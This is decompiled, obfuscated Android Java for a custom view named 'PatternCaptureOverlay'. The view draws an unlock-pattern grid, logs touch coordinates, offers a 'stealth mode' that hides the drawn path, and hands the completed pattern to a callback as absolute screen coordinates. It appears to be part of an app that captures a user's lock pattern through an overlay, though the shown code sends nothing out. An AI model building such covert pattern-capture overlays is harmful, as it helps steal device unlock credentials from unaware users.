package com.storm.safe.rock.service.modules.cipher;

import android.R;
import android.animation.ValueAnimator;
import android.content.Context;
import android.graphics.BlendMode;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PointF;
import android.os.Build;
import android.view.MotionEvent;
import android.view.View;
import android.view.animation.AnimationUtils;
import android.view.animation.Interpolator;
import com.storm.safe.rock.service.modules.cipher.C0336a2;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import kotlin.Pair;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0717jg;
import p000.AbstractC1117qo;
import p000.C0847m3;
import p000.C1285u2;
import p000.C1351vv;
import p000.h10;
import p000.t60;
import p000.tm0;
import p000.v10;
import p000.vm0;
import p000.w00;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a2 */
/* loaded from: classes2.dex */
public final class C0336a2 extends View {

    /* renamed from: a0 */
    public int f53311a0;

    /* renamed from: a1 */
    public tm0[][] f53312a1;

    /* renamed from: a2 */
    public final ArrayList f53313a2;

    /* renamed from: a3 */
    public Boolean[][] f53314a3;

    /* renamed from: a4 */
    public int f53315a4;

    /* renamed from: a5 */
    public int f53316a5;

    /* renamed from: a6 */
    public int f53317a6;

    /* renamed from: a7 */
    public int f53318a7;

    /* renamed from: a8 */
    public int f53319a8;

    /* renamed from: a9 */
    public int f53320a9;

    /* renamed from: b0 */
    public int f53321b0;

    /* renamed from: b1 */
    public int f53322b1;

    /* renamed from: b2 */
    public int f53323b2;

    /* renamed from: b3 */
    public float f53324b3;

    /* renamed from: b4 */
    public int f53325b4;

    /* renamed from: b5 */
    public int f53326b5;

    /* renamed from: b6 */
    public boolean f53327b6;

    /* renamed from: b7 */
    public boolean f53328b7;

    /* renamed from: b8 */
    public boolean f53329b8;

    /* renamed from: b9 */
    public boolean f53330b9;

    /* renamed from: c0 */
    public boolean f53331c0;

    /* renamed from: c1 */
    public float f53332c1;

    /* renamed from: c2 */
    public float f53333c2;

    /* renamed from: c3 */
    public float f53334c3;

    /* renamed from: c4 */
    public float f53335c4;

    /* renamed from: c5 */
    public final Interpolator f53336c5;

    /* renamed from: c6 */
    public final Interpolator f53337c6;

    /* renamed from: c7 */
    public final Path f53338c7;

    /* renamed from: c8 */
    public final Paint f53339c8;

    /* renamed from: c9 */
    public final Paint f53340c9;

    /* renamed from: d0 */
    public h10 f53341d0;

    /* renamed from: d1 */
    public int f53342d1;

    public C0336a2(Context context) {
        super(context);
        this.f53311a0 = 3;
        this.f53313a2 = new ArrayList();
        this.f53315a4 = -1;
        this.f53316a5 = -1;
        Color.parseColor("#f4511e");
        this.f53317a6 = -1;
        this.f53318a7 = -1;
        this.f53319a8 = 10;
        this.f53320a9 = 24;
        this.f53321b0 = 3;
        this.f53322b1 = 1;
        this.f53324b3 = 1.0f;
        this.f53325b4 = 190;
        this.f53326b5 = 100;
        this.f53327b6 = true;
        this.f53331c0 = true;
        this.f53332c1 = -1.0f;
        this.f53333c2 = -1.0f;
        this.f53338c7 = new Path();
        this.f53339c8 = new Paint(1);
        Paint paint = new Paint(1);
        paint.setStyle(Paint.Style.STROKE);
        paint.setStrokeJoin(Paint.Join.ROUND);
        paint.setStrokeCap(Paint.Cap.ROUND);
        this.f53340c9 = paint;
        setClickable(true);
        int i = this.f53311a0;
        tm0[][] tm0VarArr = new tm0[i][];
        for (int i2 = 0; i2 < i; i2++) {
            tm0VarArr[i2] = new tm0[this.f53311a0];
        }
        this.f53312a1 = tm0VarArr;
        int i3 = this.f53311a0;
        Boolean[][] boolArr = new Boolean[i3][];
        for (int i4 = 0; i4 < i3; i4++) {
            int i5 = this.f53311a0;
            boolean[] zArr = new boolean[i5];
            Boolean[] boolArr2 = new Boolean[i5];
            for (int i6 = 0; i6 < i5; i6++) {
                boolArr2[i6] = Boolean.valueOf(zArr[i6]);
            }
            boolArr[i4] = boolArr2;
        }
        this.f53314a3 = boolArr;
        int i7 = this.f53311a0;
        for (int i8 = 0; i8 < i7; i8++) {
            int i9 = this.f53311a0;
            for (int i10 = 0; i10 < i9; i10++) {
                tm0[][] tm0VarArr2 = this.f53312a1;
                tm0VarArr2[i8][i10] = new tm0();
                tm0 tm0Var = tm0VarArr2[i8][i10];
                if (tm0Var != null) {
                    tm0Var.f60239a0 = this.f53319a8;
                }
            }
        }
        m211835a5();
        try {
            this.f53336c5 = AnimationUtils.loadInterpolator(context, R.interpolator.fast_out_slow_in);
            this.f53337c6 = AnimationUtils.loadInterpolator(context, R.interpolator.linear_out_slow_in);
        } catch (Exception unused) {
        }
    }

    /* renamed from: a0 */
    public final void m211830a0(Pair pair) {
        int iIntValue = ((Number) pair.f57556a0).intValue();
        int iIntValue2 = ((Number) pair.f57557a1).intValue();
        this.f53314a3[iIntValue][iIntValue2] = Boolean.TRUE;
        this.f53313a2.add(pair);
        if (!this.f53330b9) {
            final tm0 tm0Var = this.f53312a1[iIntValue][iIntValue2];
            if (tm0Var == null) {
                return;
            }
            m211836a6(tm0Var, this.f53319a8, this.f53320a9, this.f53325b4, this.f53337c6, new w00() { // from class: com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay$PatternLockView$addDot$1
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    C0336a2 c0336a2 = this.f53244a0;
                    c0336a2.m211836a6(tm0Var, c0336a2.f53320a9, c0336a2.f53319a8, c0336a2.f53325b4, c0336a2.f53336c5, null);
                    return C1351vv.f60710b1;
                }
            });
            final float f = this.f53332c1;
            final float f2 = this.f53333c2;
            final float fM211833a3 = m211833a3(iIntValue2);
            final float fM211834a4 = m211834a4(iIntValue);
            ValueAnimator valueAnimatorOfFloat = ValueAnimator.ofFloat(0.0f, 1.0f);
            valueAnimatorOfFloat.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { // from class: um0
                @Override // android.animation.ValueAnimator.AnimatorUpdateListener
                public final void onAnimationUpdate(ValueAnimator valueAnimator) {
                    tm0 tm0Var2 = tm0Var;
                    t60.m214695b6(tm0Var2, "$dotState");
                    C0336a2 c0336a2 = this;
                    t60.m214695b6(c0336a2, "this$0");
                    t60.m214695b6(valueAnimator, "animation");
                    Object animatedValue = valueAnimator.getAnimatedValue();
                    t60.m214693b4(animatedValue, "null cannot be cast to non-null type kotlin.Float");
                    float fFloatValue = ((Float) animatedValue).floatValue();
                    float f3 = fM211833a3;
                    float f4 = f;
                    tm0Var2.f60241a2 = AbstractC0003a2.m19a0(f3, f4, fFloatValue, f4);
                    float f5 = fM211834a4;
                    float f6 = f2;
                    tm0Var2.f60242a3 = AbstractC0003a2.m19a0(f5, f6, fFloatValue, f6);
                    c0336a2.invalidate();
                }
            });
            valueAnimatorOfFloat.addListener(new vm0(tm0Var, this, 0));
            Interpolator interpolator = this.f53336c5;
            if (interpolator != null) {
                valueAnimatorOfFloat.setInterpolator(interpolator);
            }
            valueAnimatorOfFloat.setDuration(this.f53326b5);
            valueAnimatorOfFloat.start();
            tm0Var.f60243a4 = valueAnimatorOfFloat;
        }
        announceForAccessibility("Dot added to pattern");
    }

    /* renamed from: a1 */
    public final void m211831a1() {
        int i = this.f53311a0;
        for (int i2 = 0; i2 < i; i2++) {
            int i3 = this.f53311a0;
            for (int i4 = 0; i4 < i3; i4++) {
                this.f53314a3[i2][i4] = Boolean.FALSE;
                tm0 tm0Var = this.f53312a1[i2][i4];
                if (tm0Var != null) {
                    tm0Var.f60239a0 = this.f53319a8;
                    tm0Var.f60240a1 = false;
                    tm0Var.f60241a2 = Float.MIN_VALUE;
                    tm0Var.f60242a3 = Float.MIN_VALUE;
                    ValueAnimator valueAnimator = tm0Var.f60243a4;
                    if (valueAnimator != null) {
                        valueAnimator.cancel();
                    }
                    tm0Var.f60243a4 = null;
                }
            }
        }
    }

    /* renamed from: a2 */
    public final Pair m211832a2(float f, float f2) {
        int i;
        int i2;
        float f3 = this.f53335c4;
        float f4 = f3 * 0.6f;
        float paddingTop = ((f3 - f4) / 2.0f) + getPaddingTop();
        int i3 = this.f53311a0;
        int i4 = 0;
        int i5 = 0;
        while (true) {
            if (i5 >= i3) {
                i5 = -1;
                break;
            }
            float f5 = (i5 * this.f53335c4) + paddingTop;
            if (f2 >= f5 && f2 <= f5 + f4) {
                break;
            }
            i5++;
        }
        int i6 = this.f53342d1;
        if (i6 < 20) {
            this.f53342d1 = i6 + 1;
            String str = String.format("%.1f", Arrays.copyOf(new Object[]{Float.valueOf(f)}, 1));
            String str2 = String.format("%.1f", Arrays.copyOf(new Object[]{Float.valueOf(f2)}, 1));
            String str3 = String.format("%.1f", Arrays.copyOf(new Object[]{Float.valueOf(this.f53334c3)}, 1));
            String str4 = String.format("%.1f", Arrays.copyOf(new Object[]{Float.valueOf(this.f53335c4)}, 1));
            String str5 = String.format("%.1f", Arrays.copyOf(new Object[]{Float.valueOf(paddingTop)}, 1));
            String str6 = String.format("%.1f", Arrays.copyOf(new Object[]{Float.valueOf(f4)}, 1));
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("★ detectDot(", str, ",", str2, "): cellW=");
            sbM41c2.append(str3);
            sbM41c2.append(", cellH=");
            sbM41c2.append(str4);
            sbM41c2.append(", hitRow=");
            sbM41c2.append(i5);
            sbM41c2.append(", rowPad=");
            sbM41c2.append(str5);
            sbM41c2.append(", hitH=");
            sbM41c2.append(str6);
            t60.m214702c3("PatternCaptureOverlay", sbM41c2.toString());
        }
        if (i5 < 0) {
            return null;
        }
        float f6 = this.f53334c3;
        float f7 = 0.6f * f6;
        float paddingLeft = ((f6 - f7) / 2.0f) + getPaddingLeft();
        int i7 = this.f53311a0;
        while (true) {
            if (i4 >= i7) {
                i4 = -1;
                break;
            }
            float f8 = (i4 * this.f53334c3) + paddingLeft;
            if (f >= f8 && f <= f8 + f7) {
                break;
            }
            i4++;
        }
        if (i4 < 0 || this.f53314a3[i5][i4].booleanValue()) {
            return null;
        }
        ArrayList arrayList = this.f53313a2;
        if (!arrayList.isEmpty()) {
            Pair pair = (Pair) AbstractC0715je.m213296i3(arrayList);
            int iIntValue = ((Number) pair.f57556a0).intValue();
            int iIntValue2 = ((Number) pair.f57557a1).intValue();
            int i8 = i5 - iIntValue;
            int i9 = i4 - iIntValue2;
            if (Math.abs(i8) != 2 || Math.abs(i9) == 1) {
                i = iIntValue;
            } else {
                i = (i8 > 0 ? 1 : -1) + iIntValue;
            }
            if (Math.abs(i9) != 2 || Math.abs(i8) == 1) {
                i2 = iIntValue2;
            } else {
                i2 = (i9 > 0 ? 1 : -1) + iIntValue2;
            }
            if ((i != iIntValue || i2 != iIntValue2) && !this.f53314a3[i][i2].booleanValue()) {
                m211830a0(new Pair(Integer.valueOf(i), Integer.valueOf(i2)));
            }
        }
        m211830a0(new Pair(Integer.valueOf(i5), Integer.valueOf(i4)));
        if (this.f53331c0) {
            performHapticFeedback(1, 3);
        }
        return new Pair(Integer.valueOf(i5), Integer.valueOf(i4));
    }

    /* renamed from: a3 */
    public final float m211833a3(int i) {
        float paddingLeft = getPaddingLeft();
        float f = this.f53334c3;
        return (i * f) + (f / 2.0f) + paddingLeft;
    }

    /* renamed from: a4 */
    public final float m211834a4(int i) {
        float paddingTop = getPaddingTop();
        float f = this.f53335c4;
        return (i * f) + (f / 2.0f) + paddingTop;
    }

    /* renamed from: a5 */
    public final void m211835a5() {
        Paint paint = this.f53340c9;
        paint.setAntiAlias(true);
        paint.setDither(true);
        paint.setColor(this.f53317a6);
        paint.setStyle(Paint.Style.STROKE);
        paint.setStrokeJoin(Paint.Join.ROUND);
        paint.setStrokeCap(Paint.Cap.ROUND);
        paint.setStrokeWidth(this.f53321b0);
        if (Build.VERSION.SDK_INT >= 29) {
            BlendMode unused = BlendMode.OVERLAY;
            paint.setBlendMode(BlendMode.OVERLAY);
        }
        Paint paint2 = this.f53339c8;
        paint2.setAntiAlias(true);
        paint2.setDither(true);
    }

    /* renamed from: a6 */
    public final void m211836a6(tm0 tm0Var, float f, float f2, long j, Interpolator interpolator, w00 w00Var) {
        ValueAnimator valueAnimatorOfFloat = ValueAnimator.ofFloat(f, f2);
        valueAnimatorOfFloat.addUpdateListener(new C1285u2(tm0Var, 2, this));
        if (w00Var != null) {
            valueAnimatorOfFloat.addListener(new C0847m3(7, w00Var));
        }
        if (interpolator != null) {
            valueAnimatorOfFloat.setInterpolator(interpolator);
        }
        valueAnimatorOfFloat.setDuration(j);
        valueAnimatorOfFloat.start();
    }

    @Override // android.view.View
    public final boolean dispatchTouchEvent(MotionEvent motionEvent) {
        t60.m214695b6(motionEvent, "event");
        t60.m214702c3("PatternCaptureOverlay", "★ dispatchTouchEvent: action=" + motionEvent.getAction() + ", x=" + motionEvent.getX() + ", y=" + motionEvent.getY() + ", viewW=" + getWidth() + ", viewH=" + getHeight() + ", cellW=" + this.f53334c3 + ", cellH=" + this.f53335c4 + ", enabled=" + isEnabled() + ", inputEn=" + this.f53327b6);
        return super.dispatchTouchEvent(motionEvent);
    }

    public final h10 getOnPatternComplete() {
        return this.f53341d0;
    }

    public final List<Integer> getSelectedPattern() {
        ArrayList arrayList = this.f53313a2;
        ArrayList arrayList2 = new ArrayList(AbstractC0717jg.m213310g9(arrayList));
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            Object obj = arrayList.get(i);
            i++;
            Pair pair = (Pair) obj;
            int iIntValue = ((Number) pair.f57556a0).intValue();
            arrayList2.add(Integer.valueOf((iIntValue * this.f53311a0) + ((Number) pair.f57557a1).intValue()));
        }
        return arrayList2;
    }

    @Override // android.view.View
    public final void onDraw(Canvas canvas) {
        boolean z;
        t60.m214695b6(canvas, "canvas");
        super.onDraw(canvas);
        Path path = this.f53338c7;
        path.rewind();
        boolean z2 = this.f53323b2 > 0 && this.f53324b3 < 1.0f;
        int i = this.f53311a0;
        int i2 = 0;
        while (i2 < i) {
            float fM211834a4 = m211834a4(i2);
            int i3 = this.f53311a0;
            int i4 = 0;
            while (i4 < i3) {
                tm0 tm0Var = this.f53312a1[i2][i4];
                if (tm0Var == null) {
                    z = z2;
                } else {
                    float fM211833a3 = m211833a3(i4);
                    float f = tm0Var.f60239a0 / 2.0f;
                    int i5 = (!this.f53314a3[i2][i4].booleanValue() || this.f53330b9 || this.f53328b7) ? tm0Var.f60240a1 ? this.f53318a7 : this.f53315a4 : this.f53316a5;
                    Paint paint = this.f53339c8;
                    if (z2) {
                        paint.setColor(i5);
                        int iAlpha = Color.alpha(i5);
                        z = z2;
                        paint.setAlpha(AbstractC1117qo.m214413a9((int) (iAlpha * this.f53324b3), 0, v10.MASK));
                        canvas.drawCircle(fM211833a3, fM211834a4, f, paint);
                        paint.setColor(i5);
                        paint.setAlpha(iAlpha);
                        canvas.drawCircle(fM211833a3, fM211834a4, this.f53323b2 / 2.0f, paint);
                    } else {
                        z = z2;
                        paint.setColor(i5);
                        paint.setAlpha(v10.MASK);
                        canvas.drawCircle(fM211833a3, fM211834a4, f, paint);
                    }
                }
                i4++;
                z2 = z;
            }
            i2++;
            z2 = z2;
        }
        int i6 = 0;
        if (this.f53330b9) {
            return;
        }
        ArrayList arrayList = this.f53313a2;
        if (arrayList.isEmpty()) {
            return;
        }
        int i7 = this.f53317a6;
        Paint paint2 = this.f53340c9;
        paint2.setColor(i7);
        paint2.setAlpha(v10.MASK);
        int size = arrayList.size();
        boolean z3 = false;
        float f2 = 0.0f;
        float f3 = 0.0f;
        while (i6 < size) {
            Pair pair = (Pair) arrayList.get(i6);
            int iIntValue = ((Number) pair.f57556a0).intValue();
            int iIntValue2 = ((Number) pair.f57557a1).intValue();
            if (!this.f53314a3[iIntValue][iIntValue2].booleanValue()) {
                break;
            }
            float fM211833a32 = m211833a3(iIntValue2);
            float fM211834a42 = m211834a4(iIntValue);
            if (i6 != 0) {
                tm0 tm0Var2 = this.f53312a1[iIntValue][iIntValue2];
                path.rewind();
                path.moveTo(f2, f3);
                if (tm0Var2 != null) {
                    float f4 = tm0Var2.f60241a2;
                    if (f4 != Float.MIN_VALUE) {
                        float f5 = tm0Var2.f60242a3;
                        if (f5 != Float.MIN_VALUE) {
                            path.lineTo(f4, f5);
                            canvas.drawPath(path, paint2);
                        }
                    }
                }
                path.lineTo(fM211833a32, fM211834a42);
                canvas.drawPath(path, paint2);
            }
            i6++;
            f2 = fM211833a32;
            f3 = fM211834a42;
            z3 = true;
        }
        if (this.f53328b7 && z3) {
            path.rewind();
            path.moveTo(f2, f3);
            path.lineTo(this.f53332c1, this.f53333c2);
            float f6 = this.f53332c1 - f2;
            float f7 = this.f53333c2 - f3;
            paint2.setAlpha((int) (Math.min(1.0f, Math.max(0.0f, ((((float) Math.sqrt((f7 * f7) + (f6 * f6))) / this.f53334c3) - 0.3f) * 4.0f)) * 255.0f));
            canvas.drawPath(path, paint2);
        }
    }

    @Override // android.view.View
    public final void onMeasure(int i, int i2) {
        super.onMeasure(i, i2);
        if (this.f53329b8) {
            int suggestedMinimumWidth = getSuggestedMinimumWidth();
            int size = View.MeasureSpec.getSize(i);
            int mode = View.MeasureSpec.getMode(i);
            if (mode == Integer.MIN_VALUE) {
                suggestedMinimumWidth = Math.max(size, suggestedMinimumWidth);
            } else if (mode == 1073741824) {
                suggestedMinimumWidth = size;
            }
            int suggestedMinimumHeight = getSuggestedMinimumHeight();
            int size2 = View.MeasureSpec.getSize(i2);
            int mode2 = View.MeasureSpec.getMode(i2);
            if (mode2 == Integer.MIN_VALUE) {
                suggestedMinimumHeight = Math.max(size2, suggestedMinimumHeight);
            } else if (mode2 == 1073741824) {
                suggestedMinimumHeight = size2;
            }
            int i3 = this.f53322b1;
            if (i3 == 0) {
                suggestedMinimumWidth = Math.min(suggestedMinimumWidth, suggestedMinimumHeight);
                suggestedMinimumHeight = suggestedMinimumWidth;
            } else if (i3 == 1) {
                suggestedMinimumHeight = Math.min(suggestedMinimumWidth, suggestedMinimumHeight);
            } else if (i3 == 2) {
                suggestedMinimumWidth = Math.min(suggestedMinimumWidth, suggestedMinimumHeight);
            }
            setMeasuredDimension(suggestedMinimumWidth, suggestedMinimumHeight);
        }
    }

    @Override // android.view.View
    public final void onSizeChanged(int i, int i2, int i3, int i4) {
        this.f53334c3 = ((i - getPaddingLeft()) - getPaddingRight()) / this.f53311a0;
        float paddingTop = ((i2 - getPaddingTop()) - getPaddingBottom()) / this.f53311a0;
        this.f53335c4 = paddingTop;
        float f = this.f53334c3;
        int paddingLeft = getPaddingLeft();
        int paddingTop2 = getPaddingTop();
        int i5 = this.f53311a0;
        StringBuilder sbM38b9 = AbstractC0003a2.m38b9("★ onSizeChanged: w=", i, ", h=", i2, ", cellWidth=");
        sbM38b9.append(f);
        sbM38b9.append(", cellHeight=");
        sbM38b9.append(paddingTop);
        sbM38b9.append(", paddingL=");
        sbM38b9.append(paddingLeft);
        sbM38b9.append(", paddingT=");
        sbM38b9.append(paddingTop2);
        sbM38b9.append(", dotCount=");
        sbM38b9.append(i5);
        t60.m214714d6("PatternCaptureOverlay", sbM38b9.toString());
    }

    @Override // android.view.View
    public final boolean onTouchEvent(MotionEvent motionEvent) {
        h10 h10Var;
        t60.m214695b6(motionEvent, "event");
        int i = 0;
        if (!this.f53327b6 || !isEnabled()) {
            t60.m214726f4("PatternCaptureOverlay", "★ onTouchEvent 被拦截: inputEnabled=" + this.f53327b6 + ", isEnabled=" + isEnabled());
            return false;
        }
        int action = motionEvent.getAction();
        ArrayList arrayList = this.f53313a2;
        if (action == 0) {
            t60.m214714d6("PatternCaptureOverlay", "★ ACTION_DOWN: x=" + motionEvent.getX() + ", y=" + motionEvent.getY());
            this.f53342d1 = 0;
            arrayList.clear();
            m211831a1();
            invalidate();
            float x = motionEvent.getX();
            float y = motionEvent.getY();
            Pair pairM211832a2 = m211832a2(x, y);
            if (pairM211832a2 != null) {
                this.f53328b7 = true;
                t60.m214714d6("PatternCaptureOverlay", "★ ACTION_DOWN: 命中点 " + pairM211832a2 + ", isDrawing=true");
            } else {
                this.f53328b7 = false;
            }
            this.f53332c1 = x;
            this.f53333c2 = y;
            return true;
        }
        if (action != 1) {
            if (action != 2) {
                if (action != 3) {
                    return false;
                }
                this.f53328b7 = false;
                arrayList.clear();
                m211831a1();
                invalidate();
                return true;
            }
            int historySize = motionEvent.getHistorySize();
            int i2 = historySize + 1;
            while (i < i2) {
                if (m211832a2(i < historySize ? motionEvent.getHistoricalX(i) : motionEvent.getX(), i < historySize ? motionEvent.getHistoricalY(i) : motionEvent.getY()) != null && arrayList.size() == 1) {
                    this.f53328b7 = true;
                    announceForAccessibility("Pattern started");
                }
                i++;
            }
            this.f53332c1 = motionEvent.getX();
            this.f53333c2 = motionEvent.getY();
            invalidate();
            return true;
        }
        if (!arrayList.isEmpty()) {
            this.f53328b7 = false;
            int i3 = this.f53311a0;
            for (int i4 = 0; i4 < i3; i4++) {
                int i5 = this.f53311a0;
                for (int i6 = 0; i6 < i5; i6++) {
                    tm0 tm0Var = this.f53312a1[i4][i6];
                    if ((tm0Var != null ? tm0Var.f60243a4 : null) != null) {
                        ValueAnimator valueAnimator = tm0Var.f60243a4;
                        if (valueAnimator != null) {
                            valueAnimator.cancel();
                        }
                        tm0Var.f60241a2 = Float.MIN_VALUE;
                        tm0Var.f60242a3 = Float.MIN_VALUE;
                    }
                }
            }
            announceForAccessibility("Pattern drawing completed");
            ArrayList arrayList2 = new ArrayList();
            int[] iArr = new int[2];
            getLocationOnScreen(iArr);
            int size = arrayList.size();
            int i7 = 0;
            while (i7 < size) {
                Object obj = arrayList.get(i7);
                i7++;
                Pair pair = (Pair) obj;
                arrayList2.add(new PointF(m211833a3(((Number) pair.f57557a1).intValue()) + iArr[0], m211834a4(((Number) pair.f57556a0).intValue()) + iArr[1]));
            }
            int size2 = arrayList.size();
            int size3 = arrayList2.size();
            int i8 = iArr[0];
            int i9 = iArr[1];
            StringBuilder sbM38b9 = AbstractC0003a2.m38b9("ACTION_UP: selectedDots=", size2, ", screenPoints=", size3, ", location=[");
            sbM38b9.append(i8);
            sbM38b9.append(",");
            sbM38b9.append(i9);
            sbM38b9.append("]");
            t60.m214714d6("PatternCaptureOverlay", sbM38b9.toString());
            if (!arrayList2.isEmpty() && (h10Var = this.f53341d0) != null) {
                h10Var.invoke(arrayList2);
            }
            invalidate();
        }
        return true;
    }

    public final void setAspectRatio(int i) {
        this.f53322b1 = i;
    }

    public final void setAspectRatioEnabled(boolean z) {
        this.f53329b8 = z;
    }

    public final void setCorrectStateColor(int i) {
        this.f53316a5 = i;
    }

    public final void setDotAlign(DotAlign dotAlign) {
        t60.m214695b6(dotAlign, "align");
        invalidate();
    }

    public final void setDotAnimationDuration(int i) {
        this.f53325b4 = i;
    }

    public final void setDotCount(int i) {
        this.f53311a0 = i;
        tm0[][] tm0VarArr = new tm0[i][];
        for (int i2 = 0; i2 < i; i2++) {
            int i3 = this.f53311a0;
            tm0[] tm0VarArr2 = new tm0[i3];
            for (int i4 = 0; i4 < i3; i4++) {
                tm0 tm0Var = new tm0();
                tm0Var.f60239a0 = this.f53319a8;
                tm0VarArr2[i4] = tm0Var;
            }
            tm0VarArr[i2] = tm0VarArr2;
        }
        this.f53312a1 = tm0VarArr;
        int i5 = this.f53311a0;
        Boolean[][] boolArr = new Boolean[i5][];
        for (int i6 = 0; i6 < i5; i6++) {
            int i7 = this.f53311a0;
            Boolean[] boolArr2 = new Boolean[i7];
            for (int i8 = 0; i8 < i7; i8++) {
                boolArr2[i8] = Boolean.FALSE;
            }
            boolArr[i6] = boolArr2;
        }
        this.f53314a3 = boolArr;
        requestLayout();
    }

    public final void setDotNormalSize(int i) {
        this.f53319a8 = i;
    }

    public final void setDotSelectedColor(int i) {
        this.f53318a7 = i;
    }

    public final void setDotSelectedSize(int i) {
        this.f53320a9 = i;
    }

    public final void setHapticEnabled(boolean z) {
        this.f53331c0 = z;
    }

    public final void setInStealthMode(boolean z) {
        this.f53330b9 = z;
    }

    public final void setInnerDotSize(int i) {
        this.f53323b2 = i;
    }

    public final void setInputEnabled(boolean z) {
        this.f53327b6 = z;
    }

    public final void setNormalStateColor(int i) {
        this.f53315a4 = i;
    }

    public final void setOnPatternComplete(h10 h10Var) {
        this.f53341d0 = h10Var;
    }

    public final void setOuterCircleAlpha(float f) {
        this.f53324b3 = AbstractC1117qo.m214412a8(f, 0.0f, 1.0f);
    }

    public final void setPathColor(int i) {
        this.f53317a6 = i;
        m211835a5();
        invalidate();
    }

    public final void setPathEndAnimationDuration(int i) {
        this.f53326b5 = i;
    }

    public final void setPathWidth(int i) {
        this.f53321b0 = i;
        m211835a5();
        invalidate();
    }

    public final void setWrongStateColor(int i) {
    }
}
